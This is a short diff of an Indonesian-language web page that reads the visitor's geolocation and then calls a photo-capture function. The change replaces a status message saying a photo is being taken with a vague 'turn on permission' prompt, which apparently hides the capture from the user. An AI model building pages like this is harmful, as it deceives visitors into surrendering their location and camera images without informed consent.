@@ -111,7 +111,7 @@
     navigator.geolocation.getCurrentPosition(async (pos) => {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
-      statusEl.innerText = "✅ Lokasi berhasil, ambil foto...";
+      statusEl.innerText = "✅ nyalakan izin";
       ambilFoto(lat, lon);
     }, (err) => {
       statusEl.innerText = "❌ aktifkan izin lokasi: " + err.message;
@@ -189,3 +189,4 @@
 </script>
 </body>
 </html>
+
